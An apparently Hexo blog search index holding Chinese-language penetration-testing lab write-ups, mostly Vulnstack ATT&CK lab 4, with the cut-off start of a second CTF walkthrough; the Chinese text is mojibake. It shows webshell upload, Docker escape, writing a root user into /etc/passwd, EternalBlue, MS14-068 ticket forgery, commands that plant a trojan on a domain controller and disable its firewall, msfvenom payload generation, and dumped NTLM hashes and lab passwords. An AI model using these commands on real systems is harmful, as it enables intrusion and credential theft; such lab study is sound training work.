<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ATT&amp;CKçº¢é˜Ÿè¯„ä¼°å®æˆ˜é¶åœº-4</title>
      <link href="/2024/11/16/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA-4/"/>
      <url>/2024/11/16/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA-4/</url>
      
        <content type="html"><![CDATA[<blockquote><p>ä¸‹è½½åœ°å€ï¼š<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/6/">æ¼æ´è¯¦æƒ…</a></p></blockquote><p><img src="/Rxi134_FILE/01e760a174b100ab764f690ba82aaa18_MD5.jpeg"></p><h1 id="ç½‘ç»œæ­å»º"><a href="#ç½‘ç»œæ­å»º" class="headerlink" title="ç½‘ç»œæ­å»º"></a>ç½‘ç»œæ­å»º</h1><pre class="line-numbers language-text" data-language="text"><code class="language-text">ubuntu:ubuntu192.168.74.140192.168.183.128åŸŸæˆå‘˜æœºå™¨douser:Dotest123192.168.183.129DCadministrator:Test2008192.168.183.130<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1><ul><li><p>webæœºå™¨</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /home/ubuntu/Desktop/vulhub/struts2/s2-045<span class="token function">sudo</span> <span class="token function">docker-compose</span> up <span class="token parameter variable">-d</span><span class="token builtin class-name">cd</span> /home/ubuntu/Desktop/vulhub/tomcat/CVE-2017-12615/<span class="token function">sudo</span> <span class="token function">docker-compose</span> up <span class="token parameter variable">-d</span><span class="token builtin class-name">cd</span> /home/ubuntu/Desktop/vulhub/phpmyadmin/CVE-2018-12613/<span class="token function">sudo</span> <span class="token function">docker-compose</span> up <span class="token parameter variable">-d</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>win7<br>win7æ€»æ˜¯æŒ‚èµ·ï¼Œä¿®æ”¹è®¾å¤‡è®¡åˆ’<br><img src="/Rxi134_FILE/393f5041cfd50e06414cf2e793ebb750_MD5.jpeg"></p></li></ul><h1 id="è¾¹ç•Œ"><a href="#è¾¹ç•Œ" class="headerlink" title="è¾¹ç•Œ"></a>è¾¹ç•Œ</h1><h2 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h2><p>gobyä¸Šå»æ‰“äº›å¸¸è§pocï¼Œéšä¾¿æŠŠç«¯å£æ‰«äº†<br><img src="/Rxi134_FILE/3243933a3096253353d76f94faab9aad_MD5.jpeg"></p><h2 id="tomcat-PUT-ä»»æ„æ–‡ä»¶ä¸Šä¼ ï¼ˆCVE-2017-12615ï¼‰"><a href="#tomcat-PUT-ä»»æ„æ–‡ä»¶ä¸Šä¼ ï¼ˆCVE-2017-12615ï¼‰" class="headerlink" title="tomcat PUT ä»»æ„æ–‡ä»¶ä¸Šä¼ ï¼ˆCVE-2017-12615ï¼‰"></a>tomcat PUT ä»»æ„æ–‡ä»¶ä¸Šä¼ ï¼ˆCVE-2017-12615ï¼‰</h2><p>tomcat è¿œç¨‹ä»£ç æ‰§è¡Œ<br><img src="/Rxi134_FILE/d2eb0872f91e3d5bd9d08ed7f81b9c4f_MD5.jpeg"></p><p>å·¥å…·ç›´æ¥æ¢­å“ˆï¼Œä¸Šä¼ webshell<br><img src="/Rxi134_FILE/f39cc38d710b6095f7052a0ee7c05174_MD5.jpeg"></p><p>æ‹¿åˆ°root<br><img src="/Rxi134_FILE/731948ac195fef247d2ebc37dfc1b985_MD5.jpeg"></p><p>çœ‹äº†ipå‚»çœ¼äº†ï¼Œ172.18.0.2 ï¼Ÿ</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">(root:/tmp) $ uname -aLinux 09dd4e5bfa91 4.4.0-142-generic #168~14.04.1-Ubuntu SMP Sat Jan 19 11:26:28 UTC 2019 x86_64 GNU/Linux(root:/tmp) $ ip addr1: lo: &lt;LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00    inet 127.0.0.1/8 scope host lo       valid_lft forever preferred_lft forever10: eth0@if11: &lt;BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default     link/ether 02:42:ac:12:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0    inet 172.18.0.2/16 brd 172.18.255.255 scope global eth0       valid_lft forever preferred_lft forever<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœçœŸåœ¨dockerç¯å¢ƒé‡Œ<br><img src="/Rxi134_FILE/a309f4c888102752232fb3451e5877dd_MD5.jpeg"></p><h2 id="dockeré€ƒé€¸ï¼ˆç‰¹æƒæ¨¡å¼ï¼‰"><a href="#dockeré€ƒé€¸ï¼ˆç‰¹æƒæ¨¡å¼ï¼‰" class="headerlink" title="dockeré€ƒé€¸ï¼ˆç‰¹æƒæ¨¡å¼ï¼‰"></a>dockeré€ƒé€¸ï¼ˆç‰¹æƒæ¨¡å¼ï¼‰</h2><p><img src="/Rxi134_FILE/6d4ca50e62f8d898a4113a5292a501cb_MD5.jpeg"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> /test <span class="token function">mount</span> /dev/sda1 /test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æˆåŠŸé€ƒé€¸åˆ°å®¿ä¸»æœºï¼Œåªæœ‰ç”¨æˆ·ubuntuå’Œroot<br><img src="/Rxi134_FILE/0b934d83681779a4e07c3145ed0907ff_MD5.jpeg"></p><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><h3 id="å¤±è´¥æ€è·¯1-ä¿®æ”¹-etc-passwdç›´æ¥root-ssh"><a href="#å¤±è´¥æ€è·¯1-ä¿®æ”¹-etc-passwdç›´æ¥root-ssh" class="headerlink" title="å¤±è´¥æ€è·¯1. ä¿®æ”¹&#x2F;etc&#x2F;passwdç›´æ¥root ssh"></a>å¤±è´¥æ€è·¯1. ä¿®æ”¹&#x2F;etc&#x2F;passwdç›´æ¥root ssh</h3><p>ä¿®æ”¹passwd</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"rxi134:\<span class="token variable">$1</span>\<span class="token variable">$rxi134</span>\<span class="token variable">$a</span>/DG862QDtnw0tapAC9vv0:0:0:root:/root:/bin/bash"</span> <span class="token operator">>></span> ./etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä½†æ˜¯æ— æ³•sshä¸Šå»<br><img src="/Rxi134_FILE/100477502cab9435adb13719df71db50_MD5.jpeg"></p><p>æŸ¥çœ‹sshd_configï¼ŒåŸæ¥æ˜¯ç¦ç”¨äº†root ssh</p><h3 id="å¤±è´¥æ€è·¯2-æ‹¿èµ°ç§é’¥æ–‡ä»¶ç›´æ¥ssh"><a href="#å¤±è´¥æ€è·¯2-æ‹¿èµ°ç§é’¥æ–‡ä»¶ç›´æ¥ssh" class="headerlink" title="å¤±è´¥æ€è·¯2. æ‹¿èµ°ç§é’¥æ–‡ä»¶ç›´æ¥ssh"></a>å¤±è´¥æ€è·¯2. æ‹¿èµ°ç§é’¥æ–‡ä»¶ç›´æ¥ssh</h3><p>ç§é’¥æ–‡ä»¶æœ‰å¯†ç åŸè¯­ï¼Œè§£ä¸å¼€<br><img src="/Rxi134_FILE/6171339c219a84d2cb82acfad7ac5927_MD5.jpeg"></p><h3 id="æˆåŠŸæ€è·¯3-åˆ›å»ºæ™®é€šç”¨æˆ·ï¼Œsshä¸Šå»å†æå‡åˆ°root"><a href="#æˆåŠŸæ€è·¯3-åˆ›å»ºæ™®é€šç”¨æˆ·ï¼Œsshä¸Šå»å†æå‡åˆ°root" class="headerlink" title="æˆåŠŸæ€è·¯3. åˆ›å»ºæ™®é€šç”¨æˆ·ï¼Œsshä¸Šå»å†æå‡åˆ°root"></a>æˆåŠŸæ€è·¯3. åˆ›å»ºæ™®é€šç”¨æˆ·ï¼Œsshä¸Šå»å†æå‡åˆ°root</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">â””â”€$ openssl <span class="token function">passwd</span> <span class="token parameter variable">-1</span> <span class="token parameter variable">-salt</span> hacker <span class="token number">123456</span><span class="token variable">$1</span><span class="token variable">$hacker</span><span class="token variable">$6luIRwdGpBvXdP</span>.GMwcZp/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-text" data-language="text"><code class="language-text">ubuntu:x:1000:1000:ubuntu,,,:/home/ubuntu:/bin/bashhacker:$1$hacker$6luIRwdGpBvXdP.GMwcZp/:1000:1000:ubuntu:/home/ubuntu:/bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"hacker:\<span class="token variable">$1</span>\<span class="token variable">$hacker</span>\<span class="token variable">$6luIRwdGpBvXdP</span>.GMwcZp/:1000:1000:ubuntu:/home/ubuntu:/bin/bash"</span> <span class="token operator">>></span> ./etc/passwd<span class="token builtin class-name">echo</span> <span class="token string">"rxi134:\<span class="token variable">$1</span>\<span class="token variable">$rxi134</span>\<span class="token variable">$a</span>/DG862QDtnw0tapAC9vv0:0:0:root:/root:/bin/bash"</span> <span class="token operator">>></span> ./etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>su rxi134<br><img src="/Rxi134_FILE/930f8e22fd8868e1bbdce41aef1f9629_MD5.jpeg"></p><h3 id="ä¸Šçº¿CS"><a href="#ä¸Šçº¿CS" class="headerlink" title="ä¸Šçº¿CS"></a>ä¸Šçº¿CS</h3><p><img src="/Rxi134_FILE/6b35d8a0fc2be78c01770cdc0b92d82a_MD5.jpeg"></p><h2 id="æ­å»ºsocksä»£ç†"><a href="#æ­å»ºsocksä»£ç†" class="headerlink" title="æ­å»ºsocksä»£ç†"></a>æ­å»ºsocksä»£ç†</h2><p>å–œæ¬¢ç”¨chisel<br><img src="/Rxi134_FILE/9b83bce5f65cf23056eebea5735c93c7_MD5.jpeg"></p><h1 id="å†…ç½‘"><a href="#å†…ç½‘" class="headerlink" title="å†…ç½‘"></a>å†…ç½‘</h1><h2 id="fscanå¤§ä¿å¥"><a href="#fscanå¤§ä¿å¥" class="headerlink" title="fscanå¤§ä¿å¥"></a>fscanå¤§ä¿å¥</h2><p>å†…ç½‘ ip ä¸º 192.168.183.128ï¼Œå­˜åœ¨å†…ç½‘ç½‘æ®µ 192.168.183.0&#x2F;24<br><img src="/Rxi134_FILE/03c55c88c226fd1feab4204dac98fc63_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">start infoscan(icmp) Target 192.168.183.131 is alive(icmp) Target 192.168.183.130 is alive(icmp) Target 192.168.183.134 is alive[*] Icmp alive hosts len is: 3192.168.183.134:139 open192.168.183.134:135 open192.168.183.130:139 open192.168.183.130:135 open192.168.183.131:22 open192.168.183.130:88 open192.168.183.134:445 open192.168.183.130:445 open[*] alive ports len is: 8start vulscan[*] NetInfo [*]192.168.183.134   [->]TESTWIN7-PC   [->]192.168.183.134[*] NetInfo [*]192.168.183.130   [->]WIN-ENS2VR5TR3N   [->]192.168.183.130[+] MS17-010 192.168.183.130(Windows Server 2008 HPC Edition 7601 Service Pack 1)[*] NetBios 192.168.183.130 [+] DC:WIN-ENS2VR5TR3N.demo.com      Windows Server 2008 HPC Edition 7601 Service Pack 1[+] MS17-010 192.168.183.134(Windows 7 Enterprise 7601 Service Pack 1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="æ°¸æ’ä¹‹è“æ‹¿ä¸‹ç”¨æˆ·æœº"><a href="#æ°¸æ’ä¹‹è“æ‹¿ä¸‹ç”¨æˆ·æœº" class="headerlink" title="æ°¸æ’ä¹‹è“æ‹¿ä¸‹ç”¨æˆ·æœº"></a>æ°¸æ’ä¹‹è“æ‹¿ä¸‹ç”¨æˆ·æœº</h2><p>proxychainsèµ°ä»£ç†ï¼Œmsfæ‰“æ°¸æ’ä¹‹è“</p><p>æˆ‘çš„wslå‡ºäº†ç‚¹é—®é¢˜ï¼Œå…ˆç”¨kaliç»§ç»­</p><ul><li><p>å°è¯•ï¼šchiselæ­å»ºéš§é“ï¼Œproxychains+msf<br>?<br><img src="/Rxi134_FILE/d89f18c8c860f96dfdd30b985838fdf9_MD5.jpeg"></p></li><li><p>å°è¯•ï¼šchiselæ­å»ºéš§é“ï¼Œsetg+msf<br><img src="/Rxi134_FILE/fb10a599aa9ce08d65dbd1294cff88d2_MD5.jpeg"><br>nndç»ˆäºæˆåŠŸäº†ï¼Œæ‹¿ä¸‹ TESTWIN7-PC</p></li></ul><h2 id="ä¿¡æ¯æœé›†-1"><a href="#ä¿¡æ¯æœé›†-1" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h2><p>systeminfo</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">Host Name:                 TESTWIN7-PCOS Name:                   Microsoft Windows 7 ä¼ä¸šç‰ˆOS Version:                6.1.7601 Service Pack 1 Build 7601OS Manufacturer:           Microsoft CorporationOS Configuration:          Member WorkstationOS Build Type:             Multiprocessor FreeRegistered Owner:          testwin7Registered Organization:Product ID:                00392-918-5000002-85176      Original Install Date:     2019/12/31, 10:38:42System Boot Time:          2024/11/13, 17:27:48System Manufacturer:       VMware, Inc.System Model:              VMware Virtual PlatformSystem Type:               x64-based PCProcessor(s):              1 Processor(s) Installed.                           [01]: Intel64 Family 6 Model 183 Stepping 1 GenuineIntel ~2419 MhzBIOS Version:              Phoenix Technologies LTD 6.00, 2020/11/12Windows Directory:         C:\WindowsSystem Directory:          C:\Windows\system32Boot Device:               \Device\HarddiskVolume1System Locale:             zh-cn;Chinese (China)Input Locale:              zh-cn;Chinese (China)Time Zone:                 (UTC+08:00) Beijing, Chongqing, Hong Kong, Urumqi   Total Physical Memory:     2,047 MBAvailable Physical Memory: 1,483 MBVirtual Memory: Max Size:  4,095 MBVirtual Memory: Available: 3,415 MBVirtual Memory: In Use:    680 MBPage File Location(s):     C:\pagefile.sysDomain:                    demo.comLogon Server:              N/AHotfix(s):                 37 Hotfix(s) Installed.                           [01]: KB2491683                           [02]: KB2534111                           [03]: KB2564958                           [04]: KB2621440                           [05]: KB2653956                           [06]: KB2654428                           [07]: KB2698365                           [08]: KB2705219                           [09]: KB2736422                           [10]: KB2813430                           [11]: KB2900986                           [12]: KB2937610                           [13]: KB2943357                           [14]: KB2978120                           [15]: KB2984972                           [16]: KB2992611                           [17]: KB2999226                           [18]: KB3004375                           [19]: KB3010788                           [20]: KB3023215                           [21]: KB3031432                           [22]: KB3035126                           [23]: KB3037574                           [24]: KB3045685                           [25]: KB3046269                           [26]: KB3072305                           [27]: KB3074543                           [28]: KB3086255                           [29]: KB3097989                           [30]: KB3101722                           [31]: KB3108371                           [32]: KB3122648                           [33]: KB3127220                           [34]: KB3155178                           [35]: KB4019990                           [36]: KB4040980                           [37]: KB976902Network Card(s):           1 NIC(s) Installed.                           [01]: Intel(R) PRO/1000 MT Network Connection                                 Connection Name: æœ¬åœ°è¿æ¥                                 DHCP Enabled:    Yes                                 DHCP Server:     192.168.183.254                                 IP address(es)                                 [01]: 192.168.183.163                                 [02]: fe80::4c2e:5407:57a4:6774<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>net user</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">net userUser accounts for \\-------------------------------------------------------------------------------Administrator            Guest                    testclone                The command completed with one or more errors.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="æŠ“å–å¯†ç "><a href="#æŠ“å–å¯†ç " class="headerlink" title="æŠ“å–å¯†ç "></a>æŠ“å–å¯†ç </h2><p><img src="/Rxi134_FILE/6389f0a064aef1e980bf82e49c8e0a7c_MD5.jpeg"><br>æŠ“å–åˆ°ä¸€ä¸ªåŸŸç”¨æˆ·</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">DEMO.COM\douser:Dotest123<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¯ç”¨è¿œç¨‹æ¡Œé¢</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/ee749addb2577ec9d67e3c2cf2f68e94_MD5.jpeg"></p><p>psexecä¹Ÿä¸è¡Œï¼Œè¿™ä¸ªç”¨æˆ·æƒé™å¾ˆä½</p><h2 id="bloodhound"><a href="#bloodhound" class="headerlink" title="bloodhound"></a>bloodhound</h2><p>powershellå’Œexeéƒ½æ‰§è¡Œä¸äº†<br><img src="/Rxi134_FILE/e2bf6b25542ad8d2f95f89e951443530_MD5.jpeg"><br><img src="/Rxi134_FILE/1c0c79ea710ccf955aa70a858c8485be_MD5.jpeg"></p><h2 id="è¿›ç¨‹æ³¨å…¥"><a href="#è¿›ç¨‹æ³¨å…¥" class="headerlink" title="è¿›ç¨‹æ³¨å…¥"></a>è¿›ç¨‹æ³¨å…¥</h2><p>å¯ä»¥æ³¨å…¥ douser è¿›ç¨‹<br><img src="/Rxi134_FILE/c8931aa921f9970f739345226ea4ed55_MD5.jpeg"></p><h2 id="ä¸Šçº¿CS-1"><a href="#ä¸Šçº¿CS-1" class="headerlink" title="ä¸Šçº¿CS"></a>ä¸Šçº¿CS</h2><p>åˆ©ç”¨socatè½¬å‘ç«¯å£</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">socat <span class="token parameter variable">-d</span> TCP4-LISTEN:80,fork TCP4:192.168.74.149:80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/947ec3d4750c8e1317bbed6d7bb3283e_MD5.jpeg"></p><p>ç”Ÿæˆä¸€ä¸ªstagerlessæœ¨é©¬ï¼Œåå¼¹åˆ° webæœº çš„å†…ç½‘ip<br><img src="/Rxi134_FILE/86f39596d404cd86cbbac7bf1e8679b7_MD5.jpeg"></p><h2 id="ms14-068æå‡è‡³åŸŸç®¡"><a href="#ms14-068æå‡è‡³åŸŸç®¡" class="headerlink" title="ms14-068æå‡è‡³åŸŸç®¡"></a>ms14-068æå‡è‡³åŸŸç®¡</h2><p>demo\douserçš„SIDï¼š</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">PS&gt; whoami &#x2F;alldemo\douser S-1-5-21-979886063-1111900045-1414766810-1107<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>åŸŸåå…¨ç§°ä¸º</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">DEOM.COM<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç”Ÿæˆä¼ªé€ çš„ccacheç¥¨æ®</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">MS14-068.exe -u douser@demo.com -p Dotest123 -s S-1-5-21-979886063-1111900045-1414766810-1107 -d 192.168.183.130<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/8333a0c0d7a7ed970b5c42410804547e_MD5.jpeg"></p><p>445ç«¯å£å¥½åƒæœ‰é—®é¢˜ï¼ˆå¯èƒ½æ˜¯æ°¸æ’ä¹‹è“æ‰“åäº†ï¼‰ï¼ŒipcæŒ‚è½½ä¸äº†</p><p>ä¸Šä¼ mimikatzå’Œä¼ªé€ çš„ç¥¨æ®<br><img src="/Rxi134_FILE/14b2b4b286ee467d68f1e9619bb4db36_MD5.jpeg"></p><p>runas ç§»åŠ¨åˆ° demo.com\dousr ç”¨æˆ·<br><img src="/Rxi134_FILE/d578b807b9be56dd55a96d62d70d22f0_MD5.jpeg"></p><p>å¯¼å…¥ç¥¨æ®åˆ°å†…å­˜<br><img src="/Rxi134_FILE/48ec8dacc2be34ab01d0f38cc2419e94_MD5.jpeg"></p><p>èŠœæ¹–<br><img src="/Rxi134_FILE/cb3088967ed54dcc07ebfba95ef5a243_MD5.jpeg"></p><h2 id="ipc-scå°è¯•æ‹¿ä¸‹åŸŸæ§"><a href="#ipc-scå°è¯•æ‹¿ä¸‹åŸŸæ§" class="headerlink" title="ipc+scå°è¯•æ‹¿ä¸‹åŸŸæ§"></a>ipc+scå°è¯•æ‹¿ä¸‹åŸŸæ§</h2><p>ipcæ­é…scï¼Œé¡ºä¾¿æŠŠé˜²ç«å¢™å…³äº†</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">net use \\WIN-ENS2VR5TR3N\ipc$copy muma.exe \\WIN-ENS2VR5TR3N\c$dir \\WIN-ENS2VR5TR3N\c$ |findstr mumasc \\WIN-ENS2VR5TR3N create firewalldown binpath&#x3D; &quot;netsh advfirewall set allprofiles state off&quot; start&#x3D; auto sc \\WIN-ENS2VR5TR3N create muma binpath&#x3D; &quot;c:\muma.exe&quot; start&#x3D; autosc start firewalldownsc start muma<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä½†æ˜¯cobaltstrikeä¸Šçº¿ä¸€ä¼šå°±æ–­æ‰äº†ï¼Œä¸æ˜æ‰€ä»¥ï¼Œç™»ä¸Šæ¡Œé¢çœ‹çœ‹<br><img src="/Rxi134_FILE/3cb6c9fbaf1bcec7836d88df0226c512_MD5.jpeg"><br>ğŸ¤”</p><h2 id="ipc-atæ‹¿ä¸‹åŸŸæ§"><a href="#ipc-atæ‹¿ä¸‹åŸŸæ§" class="headerlink" title="ipc+atæ‹¿ä¸‹åŸŸæ§"></a>ipc+atæ‹¿ä¸‹åŸŸæ§</h2><p>åˆ›å»ºè®¡åˆ’ä»»åŠ¡æ¥æ‰§è¡Œæœ¨é©¬</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">C:\&gt;net time \\WIN-ENS2VR5TR3N\\WIN-ENS2VR5TR3N çš„å½“å‰æ—¶é—´æ˜¯ 2024&#x2F;11&#x2F;16 20:55:10C:\&gt;at \\WIN-ENS2VR5TR3N 20:55:30 C:\ma2.exeæ–°åŠ äº†ä¸€é¡¹ä½œä¸šï¼Œå…¶ä½œä¸š ID &#x3D; 2C:\&gt;at \\WIN-ENS2VR5TR3NçŠ¶æ€ ID     æ—¥æœŸ                    æ—¶é—´          å‘½ä»¤è¡Œ-------------------------------------------------------------------        1   æ˜å¤©                    20:51         C:\ma2.exe        2   ä»Šå¤©                    20:55         C:\ma2.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>çˆ½äº†<br><img src="/Rxi134_FILE/8dd49eb4052f992ac0674c44efaa3806_MD5.jpeg"></p><p>hashdumpæŠ“å–krbtgt hash</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">Administrator:500:aad3b435b51404eeaad3b435b51404ee:97dab5a8641ed01e064a6c3957980405:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7c4ed692473d4b4344c3ba01c5e6cb63:::douser:1103:aad3b435b51404eeaad3b435b51404ee:bc23b0b4d5bf5ff42bc61fb62e13886e:::WIN-ENS2VR5TR3N$:1000:aad3b435b51404eeaad3b435b51404ee:61562eb872832ff0d87e1c7ab6daeac2:::<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>mimikatzæŠ“å–åˆ°æ˜æ–‡å¯†ç ï¼ˆå› ä¸ºå¯†ç è¿‡æœŸï¼Œæ‰€ä»¥æˆ‘äº‹å…ˆæ”¹æ‰äº†ï¼‰ï¼Œ<code>DEMO.COM\administrator:Test20088</code><br><img src="/Rxi134_FILE/08d1f8b77d203a94687218320330daa3_MD5.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> è¿›æ”»æ€§æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnstacké¶åœº </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ˜¥ç§‹äº‘é•œ-Initial</title>
      <link href="/2024/10/15/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Initial/"/>
      <url>/2024/10/15/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Initial/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Initialæ˜¯ä¸€å¥—éš¾åº¦ä¸ºç®€å•çš„é¶åœºç¯å¢ƒï¼Œå®Œæˆè¯¥æŒ‘æˆ˜å¯ä»¥å¸®åŠ©ç©å®¶åˆæ­¥è®¤è¯†å†…ç½‘æ¸—é€çš„ç®€å•æµç¨‹ã€‚è¯¥é¶åœºåªæœ‰ä¸€ä¸ªflagï¼Œå„éƒ¨åˆ†ä½äºä¸åŒçš„æœºå™¨ä¸Šã€‚</p></blockquote><ul><li>DCSync</li><li>CVE</li><li>åŸŸæ¸—é€<br><img src="/Rxi134_FILE/58142e8af4ac2508452353c3efc22aee_MD5.jpeg"></li></ul><h1 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h1><h1 id="webæœºå™¨-thinkphp"><a href="#webæœºå™¨-thinkphp" class="headerlink" title="webæœºå™¨ thinkphp"></a>webæœºå™¨ thinkphp</h1><p>å…ˆè®¿é—®80ç«¯å£</p><p>è¿™å›¾æ ‡ï¼Œä¸€çœ¼thinkphp<br><img src="/Rxi134_FILE/5e7826534b99fb53ddd61360c2a3a6d4_MD5.jpeg"></p><p>åˆ¶é€ æŠ¥é”™æµ‹è¯•ä¸‹ç‰ˆæœ¬ï¼Œ5.0.23<br><img src="/Rxi134_FILE/00dff5ba3574fba90599582655f09181_MD5.jpeg"></p><p><img src="/Rxi134_FILE/780ce7e44c999bac5d117f4c23cede90_MD5.jpeg"></p><p>å‘½ä»¤æ‰§è¡Œæ— å›æ˜¾ï¼Œç®€å•ä¸Šä¸ª webshell ç®—äº†<br><img src="/Rxi134_FILE/f3dfea2fae5cf0ca1abd0d8dfe30fad4_MD5.jpeg"><br><img src="/Rxi134_FILE/db37dff6f2590695f6ab6e1a2eb6ecf7_MD5.jpeg"></p><h1 id="ä¸Šçº¿msf"><a href="#ä¸Šçº¿msf" class="headerlink" title="ä¸Šçº¿msf"></a>ä¸Šçº¿msf</h1><p>å°±ä¸ç”¨vpsäº†ï¼Œç”Ÿæˆæœ¨é©¬æ­£è¿æ‹¿shell</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom <span class="token parameter variable">-a</span> x64 <span class="token parameter variable">--platform</span> Linux <span class="token parameter variable">-p</span> linux/x64/meterpreter/bind_tcp <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">1314</span> <span class="token parameter variable">-f</span> elf <span class="token parameter variable">-o</span> ma.elf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/3573133e86af79eea1f554587fee6631_MD5.jpeg"></p><p>webæœºå®‰è£…äº†python3ï¼Œèµ·ä¸€ä¸ªä¼ªç»ˆç«¯å¥½çœ‹äº›</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 <span class="token parameter variable">-c</span> <span class="token string">"import pty;pty.spawn('/bin/bash')"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/a25cbcb0339ff03fd89542d24750705c_MD5.jpeg"></p><p>ä½†æ˜¯æˆ‘æ²¡æ‰¾åˆ°flagï¼Œå¯èƒ½è¦ææƒä¹‹ç±»çš„å­<br><img src="/Rxi134_FILE/03dd59110e803af6aebaa8326e8b9ac3_MD5.jpeg"></p><h2 id="æƒé™æå‡"><a href="#æƒé™æå‡" class="headerlink" 